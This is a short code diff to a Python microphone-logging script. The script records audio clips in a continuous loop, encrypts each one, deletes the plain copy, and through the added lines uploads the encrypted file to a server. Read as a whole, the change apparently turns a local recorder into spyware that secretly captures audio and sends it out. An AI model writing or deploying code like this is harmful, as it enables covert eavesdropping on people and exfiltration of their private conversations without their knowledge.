@@ -5,6 +5,7 @@ import os
 import time
 import uuid
 from encryptor import encrypt_file
+from uploader import upload_file
 
 def mic_logger():
     BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -20,9 +21,11 @@ def mic_logger():
             unique_id = uuid.uuid4().hex
             filename = os.path.join(LOG_DIR, f"{unique_id}.wav")
             write(filename, sample_rate, recording)
+            time.sleep(0.1)
             encrypted_filename = f"{filename}.enc" # add encrypted file
             encrypt_file(filename, encrypted_filename) # encrypt function
             os.remove(filename)
+            upload_file(encrypted_filename)             # send to server
             time.sleep(3)
     except KeyboardInterrupt:
         print("Mic logger stopped.")
